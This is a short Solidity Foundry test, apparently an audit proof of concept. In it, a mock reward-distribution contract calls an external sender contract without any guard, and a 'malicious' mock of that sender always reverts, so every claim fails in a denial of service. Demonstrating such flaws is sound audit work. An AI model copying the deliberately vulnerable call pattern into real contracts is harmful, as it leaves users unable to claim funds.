// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the L1Sender contract
interface IL1Sender {
    function sendMintMessage() external;
}

// Mock L1Sender contract that always reverts
contract MaliciousL1Sender is IL1Sender {
    function sendMintMessage() external override {
        revert("Malicious revert");
    }
}

// Mock Distribution contract
contract Distribution {
    IL1Sender public l1Sender;

    constructor(address _l1Sender) {
        l1Sender = IL1Sender(_l1Sender);
    }

    function claim() external {
        // Vulnerable call to an external contract
        l1Sender.sendMintMessage();
    }
}

contract ExploitTest is Test {
    Distribution distribution;
    MaliciousL1Sender maliciousL1Sender;

    function setUp() public {
        // Deploy the malicious L1Sender contract
        maliciousL1Sender = new MaliciousL1Sender();

        // Deploy the Distribution contract with the malicious L1Sender
        distribution = new Distribution(address(maliciousL1Sender));
    }

    function test_exploit() public {
        // Attempt to claim rewards, expecting a revert due to the malicious L1Sender
        vm.expectRevert("Malicious revert");
        distribution.claim();

        // Assert that the claim function reverts, demonstrating the DoS vulnerability
    }
}